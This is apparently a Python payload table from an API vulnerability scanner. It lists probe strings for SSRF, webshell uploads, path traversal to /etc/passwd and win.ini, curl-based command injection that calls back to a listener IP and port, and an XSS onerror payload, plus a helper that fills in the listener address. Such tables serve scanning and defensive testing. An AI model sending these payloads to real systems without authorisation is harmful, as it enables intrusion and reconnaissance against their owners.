from vuln.types import VulnType

APIVulnPayloads = {
    VulnType.SSRF: ["http://IP:PORT/ssrf{0}", "https://IP:PORT/ssrf{0}"],
    VulnType.UNRESTRICTED_UPLOAD: [
        "webshell.asp",
        "webshell.aspx",
        "webshell.HTML",
        "webshell.jsp",
        "webshell.php",
        "evil.md",
    ],
    VulnType.PATH_TRAVERSAL: [
        "/etc/passwd",
        "../" * 9 + "etc/passwd",
        "C:\\Windows\\win.ini",
        "..\\" * 9 + "C:\\Windows\\win.ini",
    ],
    VulnType.COMMAND_INJECTION: [
        "curl http://IP:PORT/command{0}",
        "curl https://IP:PORT/command{0}",
    ],
    VulnType.SQLi: ["sqlmap"],
    VulnType.XSS: [
        "<img src=x onerror=alert('{xss_id}')>",
    ],
}


def adapt_api_vul_payloads(payloads: dict, http_ip: str, http_port: int, https_port: int):
    for vuln_type, payloads in payloads.items():
        for i, payload in enumerate(payloads):
            if "http://" in payload:
                payloads[i] = payload.replace("IP:PORT", f"{http_ip}:{http_port}")
            elif "https://" in payload:
                payloads[i] = payload.replace("IP:PORT", f"{http_ip}:{https_port}")
